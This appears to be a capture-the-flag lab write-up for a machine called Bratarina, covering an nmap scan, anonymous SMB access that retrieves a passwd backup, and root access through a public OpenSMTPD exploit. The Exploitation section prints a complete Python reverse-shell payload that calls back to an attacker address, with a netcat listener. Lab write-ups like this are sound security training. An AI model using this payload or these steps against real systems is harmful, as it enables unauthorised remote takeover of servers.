---
description: 12/1/2022
---

# Bratarina

## Information Gathering

Scanned all TCP ports:

```
PORT    STATE  SERVICE     VERSION
22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dbdd2cea2f85c589bcfce9a338f0d750 (RSA)
|   256 e3b765c2a78e4529bb62ec301aebed6d (ECDSA)
|_  256 d55b795bce48d85746db594fcd455def (ED25519)
25/tcp  open   smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.49.175], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
53/tcp  closed domain
80/tcp  open   http        nginx 1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB        
|_http-server-header: nginx/1.14.0 (Ubuntu)
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m14s, median: 0s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-12-01T23:59:59
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: bratarina
|   NetBIOS computer name: BRATARINA\x00
|   Domain name: \x00
|   FQDN: bratarina
|_  System time: 2022-12-01T19:00:01-05:00
```

Enumerated UDP ports:

```
```

Notes:

* 80/HTTP - <mark style="color:yellow;">nginx 1.14.0</mark>
  * <mark style="color:yellow;">Lots of broken links and other functionality</mark>
  * <mark style="color:yellow;">Viewed source code</mark>
* 25/SMTP <mark style="color:yellow;">OpenSMTPD 2.0.0</mark>
  * <mark style="color:yellow;">Searchsploit returns numerous exploits</mark>
* 445/SMB <mark style="color:yellow;">Samba 4.7.6</mark>
  * <mark style="color:yellow;">Enum4linux null shares</mark>

## Enumeration

### Port 80 - HTTP (nginx 1.14.0)

Dirsearch:

```
```

### Port 445 - Samba

Enum4Linux:

```
enum4linux 192.168.175.71
```

<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption><p>backups share</p></figcaption></figure>

smbclient (Null authentication)

```
smbclient '\\\\192.168.175.71\\backups'
Password:(press enter)
smb: \>get passwd.bak
```

* We see passwd.bak
* It is a backup of /etc/passwd

passwd.bak:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>Contents of /etc/passwd backup</p></figcaption></figure>

## Exploitation

### OpenSMTPD 6.6.1 - Remote Code Execution

{% embed url="https://www.exploit-db.com/exploits/47984" %}
PoC
{% endembed %}

Syntax for Exploit:

{% code overflow="wrap" %}
```
python3 47984 192.168.175.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.175\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
```
{% endcode %}

Nc Listener:

```
sudo nc -lnvp 80
```

## Privilege Escalation

None, landed as root

## Proofs

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption><p>Proof.txt</p></figcaption></figure>
